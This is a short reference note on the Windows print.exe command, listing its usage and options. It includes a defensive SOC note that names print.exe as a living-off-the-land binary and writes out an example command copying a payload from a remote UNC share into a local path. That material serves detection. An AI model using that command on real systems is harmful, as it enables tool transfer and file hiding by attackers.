---
created: 2026-11-21
fullpath: 'C:\Windows\System32\print.exe'
generator:
  - claude
  - microsoftlearn
tags:
  - windows
  - executable
  - printing
aliases:
  - print.exe
  - print
url:
  - https://learn.microsoft.com/windows-server/administration/windows-commands/print
---

**fullpath**:C:\Windows\System32\print.exe

# description

`print.exe` sends a text file to a printer, in the background when the printer is on a local serial or parallel port. It is a built-in Windows command; printer port configuration is done with the `mode` command.

## simple description

> ### 2026-11-21 Claude said
> print is a legacy command that sends text files to a printer port such as LPT1 or to a network print queue. It is rarely used today. If no printer is given, the job goes to LPT1. It can take multiple files at once.
>
> **SOC NOTE**: Listed in LOLBAS: print.exe /D can copy a file to another local or UNC path, including alternate data streams, e.g. `print /D:C:\dest\file.exe \\host\share\payload.exe` (T1105, T1564.004). Any modern use with /D pointing to a file path is suspicious.
>

# purpose

Sends one or more text files to a local or network printer.

# typical use cases

| usage | description |
| --- | --- |
| `print /d:lpt2 report.txt` | Sends report.txt to the printer on LPT2. |
| `print /d:\\copyroom\printer1 c:\accounting\report.txt` | Sends a file to the printer1 queue on the copyroom server. |

# options

| option | description |
| --- | --- |
| `/d:<printername>` | Printer to use: LPT1-3, COM1-4, or a network queue `\\server_name\printer_name`; defaults to LPT1. |
| `<drive>:` | Drive where the file is located; not required for the current drive. |
| `<path>` | Location of the file; not required for the current directory. |
| `<filename>[ ...]` | Required. File(s) to print; multiple files allowed. |
| `/?` | Displays help at the command prompt. |
